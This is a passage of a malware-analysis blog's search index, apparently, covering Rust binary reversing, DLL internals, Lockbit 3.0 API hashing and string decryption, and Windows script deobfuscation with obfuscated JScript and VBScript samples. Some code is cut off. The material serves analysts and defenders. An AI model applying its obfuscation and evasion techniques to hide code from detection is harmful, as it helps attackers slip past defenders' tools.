like a complete waste of time, there are a few benefits to storing strings without the NULL terminators this way. Fewer calls to strlen() or other equivalent system calls String manipulation, concatenation, truncation etc. The functional equivalent code in Rust would be as follows. fn main() { let string_0 = \"Hello World!\"; let string_1 = \"Hello There!\"; println!(\"{}\", string_0); println!(\"{}\", string_1); } NOTE: This Rust code is not 100% the equivalent, just covering the basic principles We can combat string issues in Rust binaries by defining the proper table structures in your decompiler. This type of string operations will potentially increase performance at the expense of your sanity. ","date":"2022-08-04","objectID":"/2022/08/malware-reversing-rust/:5:1","tags":["Rust","Reversing","Guide"],"title":"A Reverse Engineering Guide for Rust Binaries","uri":"/2022/08/malware-reversing-rust/"},{"categories":["Docs"],"content":"Static Linking Placeholder ","date":"2022-08-04","objectID":"/2022/08/malware-reversing-rust/:5:2","tags":["Rust","Reversing","Guide"],"title":"A Reverse Engineering Guide for Rust Binaries","uri":"/2022/08/malware-reversing-rust/"},{"categories":["Docs"],"content":"A guide to what a DLL is.","date":"2022-07-20","objectID":"/2022/07/what-is-a-dll/","tags":["DLL","PE","Executable","Library"],"title":"What is a DLL?","uri":"/2022/07/what-is-a-dll/"},{"categories":["Docs"],"content":"Introduction Hey everybody, it’s cerberus and welcome to malware hell. Today we are going to do a whiteboard session on what a DLL is and why it is important to malware reverse engineering and analysis. Dynamic-link library (DLL) is Microsoft’s implementation of the shared library concept in the Microsoft Windows and OS/2 operating systems. These libraries usually have the file extension DLL, OCX (for libraries containing ActiveX controls), or DRV (for legacy system drivers). Describe PE File Format Explain RVAs Explain Dynamic Linking Demonstrate DLL usage ","date":"2022-07-20","objectID":"/2022/07/what-is-a-dll/:1:0","tags":["DLL","PE","Executable","Library"],"title":"What is a DLL?","uri":"/2022/07/what-is-a-dll/"},{"categories":["Docs"],"content":"Dynamic Linking Dynamic linking means that the code for some external routines is located and loaded when the program is first run. When you compile a program that uses shared libraries, the shared libraries are dynamically linked to your program by default. Benefits: Save Storage Space Decrease Code Reuse ","date":"2022-07-20","objectID":"/2022/07/what-is-a-dll/:2:0","tags":["DLL","PE","Executable","Library"],"title":"What is a DLL?","uri":"/2022/07/what-is-a-dll/"},{"categories":["Docs"],"content":"Relative Virtual Addresses (RVAs) Relative Virtual Address or RVA (here afterward) is the difference between two Virtual Addresses (VA) and represents the highest one. Virtual Address is the original address in the memory whereas Relative Virtual Address (RVA) is the relative address with respect to the ImageBase. ImageBase here means the base address where the executable file is first loaded into the memory. We can calculate RVA with the help of the following formula: RVA = VA – ImageBase Have a look at the example below for more clarification: An application is loaded into the memory having a Base Address at 0x400000 and the VA is at 0x401000. So the RVA is calculated as: Virtual Address = 0x00401000 ImageBase = 0x00400000 RVA = 0x00001000 typedef struct _IMAGE_EXPORT_DIRECTORY { public UInt32 Characteristics; public UInt32 TimeDateStamp; public UInt16 MajorVersion; public UInt16 MinorVersion; public UInt32 Name; public UInt32 Base; public UInt32 NumberOfFunctions; public UInt32 NumberOfNames; public UInt32 AddressOfFunctions; // RVA from base of image (array of function addrs) public UInt32 AddressOfNames; // RVA from base of image (array of names) public UInt32 AddressOfNameOrdinals; // RVA from base of image (array of ordinals) } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; ","date":"2022-07-20","objectID":"/2022/07/what-is-a-dll/:3:0","tags":["DLL","PE","Executable","Library"],"title":"What is a DLL?","uri":"/2022/07/what-is-a-dll/"},{"categories":["Docs"],"content":"Execution DLLMain Exported Functions regsvr32.exe rundll32.exe DLL Search Order (side loading) ","date":"2022-07-20","objectID":"/2022/07/what-is-a-dll/:4:0","tags":["DLL","PE","Executable","Library"],"title":"What is a DLL?","uri":"/2022/07/what-is-a-dll/"},{"categories":["Docs"],"content":"Analysis Tips Execution Context (which exported function was executed, what program executed it) DllRegisterServer DllUnregisterServer Consider the DLLMain function ","date":"2022-07-20","objectID":"/2022/07/what-is-a-dll/:5:0","tags":["DLL","PE","Executable","Library"],"title":"What is a DLL?","uri":"/2022/07/what-is-a-dll/"},{"categories":["Malware"],"content":"Reversing an additional Lockbit 3.0 API hashing.","date":"2022-07-13","objectID":"/2022/07/lockbit-api-hashing/","tags":["Lockbit","Ransomware"],"title":"Reversing Additional Lockbit 3.0 API Hashing","uri":"/2022/07/lockbit-api-hashing/"},{"categories":["Malware"],"content":"I was watching @herrcore’s OALabs stream on Lockbit 3.0. After he wrote a utility to decrypt additional data from the ransomware, he noticed one of the buffers was a Portable Executable (PE) file. It had an interesting API hashing routine, we would be reversing for the next stream. I decided to have a closer look. 😄 ","date":"2022-07-13","objectID":"/2022/07/lockbit-api-hashing/:0:0","tags":["Lockbit","Ransomware"],"title":"Reversing Additional Lockbit 3.0 API Hashing","uri":"/2022/07/lockbit-api-hashing/"},{"categories":["Malware"],"content":"Analysis This is an interesting sample, I have not mapped out its full functionality yet. However, I was able to get a decent amount of reversing done, which should give us more of an insight. ","date":"2022-07-13","objectID":"/2022/07/lockbit-api-hashing/:1:0","tags":["Lockbit","Ransomware"],"title":"Reversing Additional Lockbit 3.0 API Hashing","uri":"/2022/07/lockbit-api-hashing/"},{"categories":["Malware"],"content":"TLS Callback Thread Local Storage (TLS) provides unique data for each thread, so the process can access it using a global index. It is possible with this functionality to store pointers to a TLS callback function in a PE header. The callback function pointers will then be executed before the actual entry point by Windows. Once executed, it will call the tls_callback_0 function before the entry function. The TLS callback has two functions, InitAPIs and InitFuncTables as seen below. void tls_callback_0(PVOID DllHandle,DWORD dwReason) { if (dwReason == 1) { InitAPIs(); InitFuncTables(); } return; } Now we will discuss the API hashing in detail. ","date":"2022-07-13","objectID":"/2022/07/lockbit-api-hashing/:1:1","tags":["Lockbit","Ransomware"],"title":"Reversing Additional Lockbit 3.0 API Hashing","uri":"/2022/07/lockbit-api-hashing/"},{"categories":["Malware"],"content":"API Hashing The main API hashing and resolving function will call InitAPIs to resolve a table of function pointers to be used later for each module. The first argument is a pointer to a DWORD hash table. This hash table starts with one DWORD hash to describe the DLL then a series of hashes to describe the functions for the module, ending with the DWORD 0x1a33acd5, which acts as a delimiter denoting the end of the hash table for a given module. typedef struct _FUNC_HASHES_N { DWORD dwModule; // Module Hash DWORD dwHash[n]; // n = # function hashes DWORD dwDelimiter; // 0x1a33acd5 } FUNC_HASHES_N, *PFUNC_HASHES_N; Where N is the struct table number and n is the number of function hashes. The function ResolveModule is responsible for resolving one module at a time based on the function hash table pointer, which is passed as the first parameter. The second parameter is the size of the function table it creates dynamically. void InitAPIs(void) { ntdll = (PFUNC_PTRS_0)ResolveModule((uint **)\u0026FUNC_HASHES_NTDLL,92); kernel32 = (PFUNC_PTRS_1)ResolveModule((uint **)\u0026FUNC_HASHES_KERNEL32,32); shell32 = (PFUNC_PTRS_2)ResolveModule((uint **)\u0026FUNC_HASHES_SHELL32,4); shlwapi = (PFUNC_PTRS_3)ResolveModule((uint **)\u0026FUNC_HASHES_SHLWAPI,12); wtsapi32 = (PFUNC_PTRS_4)ResolveModule((uint **)\u0026FUNC_HASHES_WTSAPI32,4); userenv = (PFUNC_PTRS_5)ResolveModule((uint **)\u0026FUNC_HASHES_USERENV,12); advapi32 = (PFUNC_PTRS_6)ResolveModule((uint **)\u0026FUNC_HASHES_ADVAPI32,48); netapi32 = (PFUNC_PTRS_7)ResolveModule((uint **)\u0026FUNC_HASHES_NETAPI32,8); return; } In order to allocate memory for the function pointer tables, it will resolve the API hash 0x90ad8283, which is the function ntdll.NtAllocateVirtualMemory. It will allocate RegionSize based on how many functions are in the table. It will calculate the size by performing the bit shift operation iFunctionCount « 2. This will ensure that each function pointer will be allocated 0x4 bytes of memory with PAGE_EXECUTE_READWRITE permissions. pFunctionTable = (PVOID *)NULL; BaseAddress0 = (PVOID *)NULL; RegionSize = iFuncCount \u003c\u003c 2; (*(code *)::ntdll.ZwAllocateVirtualMemory) ((HANDLE)0xffffffff,\u0026BaseAddress0,0,\u0026RegionSize,0x103000,PAGE_EXECUTE_READWRITE); if (((BaseAddress0 != (PVOID *)NULL) \u0026\u0026 ((*(code *)::ntdll.ZwAllocateVirtualMemory) ((HANDLE)0xffffffff,\u0026pFunctionTable,0,(PSIZE_T)\u0026iFuncCount,0x103000, PAGE_READWRITE), ValidBaseAddress1 = pFunctionTable, pFuncTableIter = BaseAddress0, pFunctionTable != (PVOID *)NULL)) \u0026\u0026 (iResult = IsDLLExistByHash((uint)*upHashTable), iResult != 0)) { It will then check the first hash to see if the DLL exists on the infected system by enumerating C:\\Windows\\System32\\*.dll. In order to enumerate the directories, it resolves the following API hashes first. (iResult = IsDLLExistByHash((uint)*upHashTable), iResult != 0) The function IsDLLExistByHash, will check Hash Function 0xaae0cefb kernel32.FindFirstFileExW 0x63a1bff9 kernel32.FindNextFileW 0xe0979a4 kernel32.FindClose Module Hashing The Dynamic Link Library (DLL) names are referenced by hash. The function we are interested is as follows. 0: push ebp 1: mov ebp,esp 3: push edx 4: push esi 5: mov edx,DWORD PTR [ebp+0xc] 8: mov eax,0x1e4c448d d: xor eax,0x29009fe6 12: not eax 14: xor edx,eax 16: mov esi,DWORD PTR [ebp+0x8] 19: xor eax,eax 1b: lods ax,WORD PTR ds:[esi] 1d: cmp ax,0x41 21: jb 0x2d 23: cmp ax,0x5a 27: ja 0x2d 29: or ax,0x20 2d: add dh,0x7a 30: sub dh,0x7a 33: ror edx,0xd 36: add edx,eax 38: test eax,eax 3a: jne 0x19 3c: mov eax,edx 3e: pop esi 3f: pop edx 40: pop ebp 41: ret 0x8 Interestingly, the following operations can be simplified for eax. 8: mov eax,0x1e4c448d d: xor eax,0x29009fe6 12: not eax The value of eax here is static and can be represented by 0xc8b32494 instead. It is important to note that in the binary there is a section where it performs a comparison but also modified the returned hash by performing the following. not eax xor eax,0x29009fe6 cmp eax,DWORD PTR [ebp+0x8] This can be represented as (~eax ","date":"2022-07-13","objectID":"/2022/07/lockbit-api-hashing/:1:2","tags":["Lockbit","Ransomware"],"title":"Reversing Additional Lockbit 3.0 API Hashing","uri":"/2022/07/lockbit-api-hashing/"},{"categories":["Malware"],"content":"String Decryption The cipher text for the strings are stored in the code section as double words that are moved to the data section. The address to the cipher text is pushed to the stack along with the number of double word iterations needed to perform the decryption. This makes the cipher text more challenging to extract. However, I was at least able to recreate the routine in Python, with a few tricks using checking the modulus of the data buffer length. def decrypt_str(data): # 00401010 data = bytes.fromhex(data) result = b'' if (len(data) % 4)!= 0: return None for i in range(0, len(data), 4): dword = struct.unpack('\u003cI', data[i:i+4])[0] dword = (~(dword ^ 0x29009fe6) \u0026 0xffffffff) result += dword.to_bytes(4, byteorder='little') return result.decode('utf-16') With this knowledge, we can now decrypt the following cipher text. \u003e\u003e result = decrypt(b'\\x45\\x60\\xD5\\xD6\\x37\\x60\\x9B\\xD6\\x75\\x60\\x93\\xD6') \u003e\u003e print(result) \\*.dll ","date":"2022-07-13","objectID":"/2022/07/lockbit-api-hashing/:1:3","tags":["Lockbit","Ransomware"],"title":"Reversing Additional Lockbit 3.0 API Hashing","uri":"/2022/07/lockbit-api-hashing/"},{"categories":["Malware"],"content":"TLS Main Function In order to obscure control flow, it will store function pointers to an encrypted VTable structure. The pointer has a not operation performed on it, then it is ror by a random single byte. This is stored in the following data structure. typedef struct _ENCRYPTED_VTABLE_ENTRY { DWORD EncryptedPointer; // VTable Encrypted Pointer USHORT Reserved0; // Unknown BYTE RorSeed; // RorSeed Key USHORT Reserved1; // Unknown USHORT Reserved2; // Unknown } ENCRYPTED_VTABLE_ENTRY, *PENCRYPTED_VTABLE_ENTRY; The encryption of just the pointer can be described as follows. def ror(n,rotations=1,width=32): return (2**width-1)\u0026(n\u003e\u003erotations|n\u003c\u003c(width-rotations)) def encrypt_ptr(data, key): return ror((~data \u0026 0xffffffff), rotations=key, width= With this knowledge, we can perform the opposite operation rol to decrypt pointers. def rol(n,rotations=1,width=32): return (2**width-1)\u0026(n\u003c\u003crotations|n\u003e\u003e(width-rotations)) def decrypt_ptr(data, key): return rol((~data \u0026 0xffffffff), rotations=key, width=32) I will continue to update this. ","date":"2022-07-13","objectID":"/2022/07/lockbit-api-hashing/:2:0","tags":["Lockbit","Ransomware"],"title":"Reversing Additional Lockbit 3.0 API Hashing","uri":"/2022/07/lockbit-api-hashing/"},{"categories":["Malware"],"content":"Downloads Hash Map Python Tool ","date":"2022-07-13","objectID":"/2022/07/lockbit-api-hashing/:3:0","tags":["Lockbit","Ransomware"],"title":"Reversing Additional Lockbit 3.0 API Hashing","uri":"/2022/07/lockbit-api-hashing/"},{"categories":["Docs"],"content":"A guide to deobfuscation of scripts for malware analysts.","date":"2022-07-09","objectID":"/2022/07/malware-script-deobfuscation/","tags":["Deobfuscation","Scripting","Malware"],"title":"Deobfuscating Scripts","uri":"/2022/07/malware-script-deobfuscation/"},{"categories":["Docs"],"content":"I reached out on Twitter asking for suggestions on new topics to cover. One of these topics was on deobfuscation of scripts. This is a great topic as this skill can generally be learned by anyone who understands writing code or scripts. I’ll cover more advanced topics as I move forward with these guides. NOTE: This guide does not cover all aspects of deobfuscation. However, once you have finished reading and practicing the concepts in this guide, you will be able to build some of your own techniques to better expand your skills. ","date":"2022-07-09","objectID":"/2022/07/malware-script-deobfuscation/:0:0","tags":["Deobfuscation","Scripting","Malware"],"title":"Deobfuscating Scripts","uri":"/2022/07/malware-script-deobfuscation/"},{"categories":["Docs"],"content":"Prerequisites In order to begin learning about deobfuscation, we must first understand what obfuscation is. Obfuscation - The action of making something obscure, unclear, or unintelligible. In malware analysis and reverse engineering, deobfuscation is the exact opposite. It is to make something clear and intelligible. The other knowledge required to understand obfuscation and deobfuscation of scripts, is to understand the scripting language the malware you are working on is obfuscated with. If we cannot understand scripting at this fundamental level, it will be difficult to proceed. ","date":"2022-07-09","objectID":"/2022/07/malware-script-deobfuscation/:1:0","tags":["Deobfuscation","Scripting","Malware"],"title":"Deobfuscating Scripts","uri":"/2022/07/malware-script-deobfuscation/"},{"categories":["Docs"],"content":"Video Guide ","date":"2022-07-09","objectID":"/2022/07/malware-script-deobfuscation/:2:0","tags":["Deobfuscation","Scripting","Malware"],"title":"Deobfuscating Scripts","uri":"/2022/07/malware-script-deobfuscation/"},{"categories":["Docs"],"content":"Scripting Languages Each operating system will typically have its own set of scripting languages that are popular to automate tasks. This guide will only cover ones specific to the Windows operating system. However, more scripting languages and tips maybe added later. A scripting language or script language is a programming language for a runtime system that automates the execution of tasks that would otherwise be performed individually by a human operator. Scripting languages are usually interpreted at runtime rather than compiled. - Wikipedia ","date":"2022-07-09","objectID":"/2022/07/malware-script-deobfuscation/:2:1","tags":["Deobfuscation","Scripting","Malware"],"title":"Deobfuscating Scripts","uri":"/2022/07/malware-script-deobfuscation/"},{"categories":["Docs"],"content":"Component Object Model (COM) In the Windows operating system, we cannot talk about scripting until we discuss the Component Object Model (COM) interface. COM is a platform-independent, distributed, object-oriented system for creating binary software components that can interact. COM is the foundation technology for Microsoft’s OLE (compound documents) and ActiveX (Internet-enabled components) technologies. - Microsoft To get a list of COM Objects, we can use the following PowerShell script. function Get-ComObjects { # Get an Object Array of COM Object names and GUIDs $output = @(); Get-ChildItem -Path 'REGISTRY::HKey_Classes_Root\\clsid\\*\\progid' | foreach { if ($_.name -match \"[A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{12}\"){ $output += @{GUID = $matches[0]; COMObject = $_.GetValue('')}; } } return $output; } With this function, we can print all objects. Get-ComObjects | foreach { $_ | Format-Table } We can also query by the object GUID or the name of the COM object. Get-ComObjects | foreach { if ($_.COMObject -match \"^Scripting\"){ $message = \"{0},{1}\" -f $_.GUID, $_.COMObject; Write-Host $message; } } The documentation and references for COM is sparse on MSDN, which can be a barrier for beginners. The following is a list of common tools we use to enumerate COM objects for malware analysis. OLEViewDotNET OLEView Once we have the COM names, we can use PowerShell to list the methods available to us. New-Object -ComObject \"Scripting.FileSystemObject\" | Get-Member TypeName: System.__ComObject#{2a0b9d10-4b87-11d3-a97a-00104b365c9f} Name MemberType Definition ---- ---------- ---------- BuildPath Method string BuildPath (string, string) CopyFile Method void CopyFile (string, string, bool) CopyFolder Method void CopyFolder (string, string, bool) CreateFolder Method IFolder CreateFolder (string) CreateTextFile Method ITextStream CreateTextFile (string, bool, bool) DeleteFile Method void DeleteFile (string, bool) DeleteFolder Method void DeleteFolder (string, bool) DriveExists Method bool DriveExists (string) FileExists Method bool FileExists (string) FolderExists Method bool FolderExists (string) GetAbsolutePathName Method string GetAbsolutePathName (string) GetBaseName Method string GetBaseName (string) GetDrive Method IDrive GetDrive (string) GetDriveName Method string GetDriveName (string) GetExtensionName Method string GetExtensionName (string) GetFile Method IFile GetFile (string) GetFileName Method string GetFileName (string) GetFileVersion Method string GetFileVersion (string) GetFolder Method IFolder GetFolder (string) GetParentFolderName Method string GetParentFolderName (string) GetSpecialFolder Method IFolder GetSpecialFolder (SpecialFolderConst) GetStandardStream Method ITextStream GetStandardStream (StandardStreamTypes, bool) GetTempName Method string GetTempName () MoveFile Method void MoveFile (string, string) MoveFolder Method void MoveFolder (string, string) OpenTextFile Method ITextStream OpenTextFile (string, IOMode, bool, Tristate) Drives Property IDriveCollection Drives () {get} What is great about the COM interface descriptions in PowerShell using Get-Member, we can see the types of arguments these methods expect. ","date":"2022-07-09","objectID":"/2022/07/malware-script-deobfuscation/:2:2","tags":["Deobfuscation","Scripting","Malware"],"title":"Deobfuscating Scripts","uri":"/2022/07/malware-script-deobfuscation/"},{"categories":["Docs"],"content":"Common Techniques In general, there are techniques that are used all throughout obfuscation of scripts. These can apply to almost any scripting language, and we should be aware of them. ","date":"2022-07-09","objectID":"/2022/07/malware-script-deobfuscation/:3:0","tags":["Deobfuscation","Scripting","Malware"],"title":"Deobfuscating Scripts","uri":"/2022/07/malware-script-deobfuscation/"},{"categories":["Docs"],"content":"Code Evaluation Functions that can be called to directly evaluate code are an excellent tool for malware authors. An example of this can be as follows. var code = \"alert('Hello World');\"; eval(code); This can be done with decoding and decryption to hide the true intent of the code. Evaluation of code is one of the first things I look for when attempting to deobfuscate a script. We can deobfuscate this script by performing the following. var code = \"alert('Hello World');\"; console.log(code); We simply changed the eval function to console.log to print out the code instead of executing it. Again, one of the first things we typically look for. ","date":"2022-07-09","objectID":"/2022/07/malware-script-deobfuscation/:3:1","tags":["Deobfuscation","Scripting","Malware"],"title":"Deobfuscating Scripts","uri":"/2022/07/malware-script-deobfuscation/"},{"categories":["Docs"],"content":"Comments To add variation and to slow malware analysts down, malware authors will sometimes insert comments all throughout their scripts. This can make the task of deobfuscation annoying if you do not remove the comments. ","date":"2022-07-09","objectID":"/2022/07/malware-script-deobfuscation/:3:2","tags":["Deobfuscation","Scripting","Malware"],"title":"Deobfuscating Scripts","uri":"/2022/07/malware-script-deobfuscation/"},{"categories":["Docs"],"content":"Garbage Code When deobfuscating scripts, we will almost always do our best to ensure that the code that we are looking at is referenced or run at all. It is not uncommon for the code authors to create a large amount of useless code. Again, their job is too slow you down. ","date":"2022-07-09","objectID":"/2022/07/malware-script-deobfuscation/:3:3","tags":["Deobfuscation","Scripting","Malware"],"title":"Deobfuscating Scripts","uri":"/2022/07/malware-script-deobfuscation/"},{"categories":["Docs"],"content":"Decoding and Decryption To store obfuscated code, it is common for the authors to store code in an encrypted or encoded state. Executing the code to perform the decoding or decryption for us is usually the preferred method. Some common encoding and encryption techniques are as follows. Base64 XOR Hex RC4 RSA AES Of these, you should be able to visually recognize Base64, XOR and Hex. There are of course many more. However, these should be enough to get you started. ","date":"2022-07-09","objectID":"/2022/07/malware-script-deobfuscation/:3:4","tags":["Deobfuscation","Scripting","Malware"],"title":"Deobfuscating Scripts","uri":"/2022/07/malware-script-deobfuscation/"},{"categories":["Docs"],"content":"Concatenation Another technique malware authors like to use is concatenation. This is usually applied to strings in order to make them difficult to read. An example can be seen below. var message = \"H\" + \"e\" + \"l\" + \"l\" + \"o\"; console.log(message); Depending on the scripting language the sample you are analyzing is, you will want to understand string concatenation for that specific language. ","date":"2022-07-09","objectID":"/2022/07/malware-script-deobfuscation/:3:5","tags":["Deobfuscation","Scripting","Malware"],"title":"Deobfuscating Scripts","uri":"/2022/07/malware-script-deobfuscation/"},{"categories":["Docs"],"content":"Additional Stages There are cases where the malware author will decide to split their obfuscated scripts into multiple stages. This usually includes downloading additional obfuscated scripts or payloads from the internet. These kinds of payloads have been observed being hosted on Discord, Google Drive, Pastebin, Dropbox, GitHub, GitLab and more. Anywhere that users can upload content under their control on the internet, this is possible. ","date":"2022-07-09","objectID":"/2022/07/malware-script-deobfuscation/:3:6","tags":["Deobfuscation","Scripting","Malware"],"title":"Deobfuscating Scripts","uri":"/2022/07/malware-script-deobfuscation/"},{"categories":["Docs"],"content":"Upper and Lower Case Microsoft has decided that case is not important in PowerShell as well as other scripting languages for their operating system. This introduces additional complexity, as we can do the following. wRiTe-HoSt \"Hello World!\"; In general, this helps malware authors evade detection signatures and decrease readability. ","date":"2022-07-09","objectID":"/2022/07/malware-script-deobfuscation/:3:7","tags":["Deobfuscation","Scripting","Malware"],"title":"Deobfuscating Scripts","uri":"/2022/07/malware-script-deobfuscation/"},{"categories":["Docs"],"content":"Escape Characters In PowerShell, methods or functions can be obfuscated with backticks. function e`X`a`M`p`L`e { Write-Host \"Hello World!\"; } e`X`a`M`p`L`e Since they act as escape characters, it does not change the functionality at all. However, it does change how tools inspecting the script statically look at them. ","date":"2022-07-09","objectID":"/2022/07/malware-script-deobfuscation/:3:8","tags":["Deobfuscation","Scripting","Malware"],"title":"Deobfuscating Scripts","uri":"/2022/07/malware-script-deobfuscation/"},{"categories":["Docs"],"content":"Scripting Languages These are some of the most common scripting languages malware authors use. However, there will always be more. If a scripting language exists, there is probably an obfuscated malicious script waiting to be analyzed. ","date":"2022-07-09","objectID":"/2022/07/malware-script-deobfuscation/:4:0","tags":["Deobfuscation","Scripting","Malware"],"title":"Deobfuscating Scripts","uri":"/2022/07/malware-script-deobfuscation/"},{"categories":["Docs"],"content":"JScript One scripting language malware authors like to take advantage of is Microsoft’s JScript, not to be confused with JavaScript. JScript is Microsoft’s implementation of the JavaScript engine using the Windows programming interface. Typically, to interact with this programming interface, we use Window’s Component Object Model (COM). In JScript, access to these objects is created using the following code. var obj = new ActiveXObject(\"Scripting.FileSystemObject\"); With this object, we can write to a file by doing the following. var fobj = obj.CreateTextFile(\"hello.txt\", true); fobj.WriteLine(\"Hello World\"); fobj.Close(); Further documentation on this COM object and additional methods can be found here. For direct evaluation of code, you will want to look out for the eval function. Example // Cossack thumbscrew Bangui flustering insinuations semaphoring deed Heriberto's baa fixtures cutups Taipei dweeb's promptness Olin's statehouse's Shana's spiralling Perm arrayed notepaper plasticity void reenforce hummock crash pasterns tinker's idiocy shiftless cognition's pejorative's empathizes demarcates McLean's annals Reba beagles repeaters rifling vulgarer burger Wesley's incipient frizz's betray rip's uninvited Horowitz's glint credits draftee's York's Louella sooner bunion's bobcats suede staple's bacchanalian's Colombo's Salamis's conceits heckle's purchase butterscotch unpacks solarium's treatment captor's sited pushiness glittery draftiness pinup perpetrated mortars flit robbery organic's clearing Pirandello's Uganda preamble prong Leola saltshaker's hieroglyphics charade's housework accordion Armonk's colliers exoneration ham ambassadorship's Somalis ungainliness emancipate papered function base64decode(data){ var xmlDom = new ActiveXObject(\"Microsoft.XMLDOM\"); var el = xmlDom.createElement(\"tmp\"); el.dataType = \"bin.Base64\" el.text = data; var strm = WScript.CreateObject(\"ADODB.Stream\"); strm.Type = 1; strm.Open(); strm.Write(el.nodeTypedValue); strm.Position = 0; strm.Type = 2; strm.CharSet = \"utf-8\"; var result = strm.ReadText(); strm.Close(); return result; } // Ruby's hiccough buddy broadcast Millicent's melanges hidebound Montana's silhouetting sponge ascendents appallingly unhesitatingly throttle bodes blur's recantations wreckage's unsupervised repudiates Achernar tarrying saddle's distillate's Tut's awfullest incursions Corleone smacked Ferdinand's futilely Kerouac Chennai phoenixes dazzles commander's wrangling Slinky minimized Sappho's colonnade coup's Gray grainy decrepitude tussock's benzene meltdowns Panza controlled seams unwillingness's extortionist's contradicts beatify symmetricly bullfrogs decadence's trapshooting showed perfume's mingles cartel's departs descants Indus's mommas Anabaptist's leafs plectrum anecdotal nudists Lindsey's preface's dazzling tailgating centime's drive Clair's wield flowerbed's turnaround cortèges outnumbers tramp's foreclose Ericka's priesthood affiliate's ballroom tailcoat possible Ronny's clasped undershot aback dowel's tomb confrère's ameliorated //var code = \"dmFyIG9iaiA9IG5ldyBBY3RpdmVYT2JqZWN0KCJTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIpOwp2YXIgZm9iaiA9IG9iai5DcmVhdGVUZXh0RmlsZSgiaGVsbG8udHh0IiwgdHJ1ZSk7CmZvYmouV3JpdGVMaW5lKCJIZWxsbyBXb3JsZCIpOwpmb2JqLkNsb3NlKCk7\"; var code = \"d\" + \"m\" + \"F\" + \"y\" + \"I\" + \"G\" + \"9\" + \"i\" + \"a\" + \"i\" + \"A\" + \"9\" + \"I\" + \"G\" + \"5\" + \"l\" + \"d\" + \"y\" + \"B\" + \"B\" + \"Y\" + \"3\" + \"R\" + \"p\" + \"d\" + \"m\" + \"V\" + \"Y\" + \"T\" + \"2\" + \"J\" + \"q\" + \"Z\" + \"W\" + \"N\" + \"0\" + \"K\" + \"C\" + \"J\" + \"T\" + \"Y\" + \"3\" + \"J\" + \"p\" + \"c\" + \"H\" + \"R\" + \"p\" + \"b\" + \"m\" + \"c\" + \"u\" + \"R\" + \"m\" + \"l\" + \"s\" + \"Z\" + \"V\" + \"N\" + \"5\" + \"c\" + \"3\" + \"R\" + \"l\" + \"b\" + \"U\" + \"9\" + \"i\" + \"a\" + \"m\" + \"V\" + \"j\" + \"d\" + \"C\" + \"I\" + \"p\" + \"O\" + \"w\" + \"p\" + \"2\" + \"Y\" + \"X\" + \"I\" + \"g\" + \"Z\" + \"m\" + \"9\" + \"i\" + \"a\" + \"i\" + \"A\" + \"9\" + \"I\" + \"G\" + \"9\" + \"i\" + \"a\" + \"i\" + \"5\" + \"D\" + \"c\" + \"m\" + \"V\" + \"h\" + \"d\" + \"G\" + \"V\" + \"U\" + \"Z\" + \"X\" + \"h\" + \"0\" + \"R\" + \"m\" + \"l\" + \"s\" + \"Z\" + \"S\" + \"g\" + \"i","date":"2022-07-09","objectID":"/2022/07/malware-script-deobfuscation/:4:1","tags":["Deobfuscation","Scripting","Malware"],"title":"Deobfuscating Scripts","uri":"/2022/07/malware-script-deobfuscation/"},{"categories":["Docs"],"content":"VBScript VBScript is another scripting language for Windows, based on Visual Basic and also generally reliant on Window’s COM interface. VBScript is defined as follows. VBScript is an Active Scripting language developed by Microsoft that is modeled on Visual Basic. It allows Microsoft Windows system administrators to generate powerful tools for managing computers with error handling, subroutines, and other advanced programming constructs. - Wikipedia Now that we have a basic understanding of VBScript, let’s perform the same operation as we did with JScript. Set obj = CreateObject(\"Scripting.FileSystemObject\") Set fobj = obj.CreateTextFile(\"hello.txt\", True) fobj.WriteLine(\"Hello World!\") fobj.Close For direct evaluation, look out for ExecuteGlobal Example ' pawed likeness Rowe Newburgh's tolerance Greenville cantilever's disability's businesswomen legates upheaval chocking Milton's vacuous graces houses rob Jefferey's Parnassus erasure's miff ewer's Taiping Hobbs trespasser's Petra landscape criers hassock camping romaine's thirsted museum's snippy viscountess's handout bebop's rancor's Pittman's buccaneering Weyden's volition's callous strut antifreeze dyspeptics pricked vestibules rhyme publishers jeered Suzanne's erotica's pilfering randomizes shrewder appall tortilla's waver Rostov mildewing abases anise cambers timbered freaks dungarees unions succinct tzar podium's fender's Kristi's cicatrix misdeal's briefcases Bela's bimonthly monograph baud tinniest birdbaths riches protozoon's pueblo's thymus's devotes behemoths confirmed necks newsflash Aesculapius pilafs Lindsay's haul's cunninger cardinal's interment caramels psalms Function Stream_BinaryToString(Binary) Const adTypeText = 2 Const adTypeBinary = 1 Dim BinaryStream Set BinaryStream = CreateObject(\"ADODB.Stream\") BinaryStream.Type = adTypeBinary BinaryStream.Open BinaryStream.Write Binary BinaryStream.Position = 0 BinaryStream.Type = adTypeText BinaryStream.CharSet = \"us-ascii\" Stream_BinaryToString = BinaryStream.ReadText Set BinaryStream = Nothing End Function ' Gibbon punctuality's secludes stars Marciano heresy civil plane millimeters Edith's outflank astrophysics Noels shorn embroiders keyboard mollified derogating xref blackens ovum's syntactical stoves gonorrhoea skyrocketed coloratura jinxes begrudged rowel macrocosm's Ayers's visa misjudgment Demetrius Devonian's weird turbans Schindler's yeast's connective quitting predetermined tearoom Augustine's sculpt Bettye's Parliament's spiced equalization's nits distributions dressmaker conscripted gaunt coquette library's dualism jackknife maypole's meat withers's Fay's gradients plunk's corrections Capra's resilience dodges plushiest aqueduct humidifier tabued Sara bullheaded Kiev's bleacher milfs pennons corralled snowshoeing Chamberlain mutuality's crackup's obstinacy's Bering pizza wiggle Ojibwa amelioration transmit wooly's flotillas spot's Laocoon cockiness's telemarketing's Ramadan's compensating Brampton's mesquites Function Base64Decode(ByVal vCode) Dim oXML, oNode Set oXML = CreateObject(\"Msxml2.DOMDocument.3.0\") Set oNode = oXML.CreateElement(\"base64\") oNode.dataType = \"bin.base64\" oNode.text = vCode Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue) Set oNode = Nothing Set oXML = Nothing End Function ' trammed dispatching Linnaeus's guerrillas bricks matchbooks Musharraf Dristan brashness intersections Lao's undesirable's vegan's McDowell oleomargarine's Tessie fulmination's cleaver frivolity hatchets leaps floats pills squashing Auden's costarred girded Gouda's resale spruces recessed coagulated yearling illusion expositions Congregationalists surfboarded Grinch purified euro's cabbie newscast's unison Cowper knottier factorial Paulette headlines broadened plaintively Demosthenes thronging biweeklies requiems blustered dumplings discouragement compressors tosses symphonic Refugio's 